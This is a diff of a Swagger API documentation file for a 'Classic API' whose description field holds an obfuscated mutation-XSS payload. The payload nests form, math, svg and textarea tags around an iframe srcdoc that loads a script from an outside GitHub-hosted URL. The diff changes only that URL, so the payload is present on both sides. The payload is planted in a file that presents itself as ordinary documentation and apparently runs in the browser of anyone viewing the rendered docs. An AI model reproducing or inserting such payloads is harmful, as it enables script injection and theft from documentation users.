@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-      <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://raw.githubusercontent.com/ProcureSign/introduction.github.io/main/script.js></script>">
+      <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://github.com/ProcureSign/introduction.github.io/blob/main/script.js></script>">
   version: production
 basePath: /JSSResource/
 produces:
